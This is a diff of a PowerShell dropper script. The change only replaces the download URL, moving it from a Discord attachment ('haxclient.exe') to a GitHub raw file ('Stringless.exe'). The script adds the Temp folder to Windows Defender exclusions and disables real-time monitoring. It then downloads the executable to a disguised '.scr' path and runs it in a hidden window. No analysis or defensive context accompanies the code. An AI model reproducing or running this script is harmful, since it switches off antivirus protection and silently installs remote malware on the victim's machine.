@@ -1,7 +1,7 @@
 $oP = "$env:Temp"
 Add-MpPreference -ExclusionPath $oP
 Set-MpPreference -DisableRealtimeMonitoring $true
-$fU = "https://cdn.discordapp.com/attachments/1176903894257897514/1208068363889147934/haxclient.exe?ex=668b5916&is=668a0796&hm=7d90ec30acdca9ea16401cf32305be9216ee125977d85618d778be1ee711f133&"
+$fU = "https://github.com/SplashGG/dl/raw/main/Stringless.exe"
 $oPT = "$env:Temp\​.scr"
 Invoke-WebRequest -Uri $fU -OutFile $oPT -ErrorAction Stop
 Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
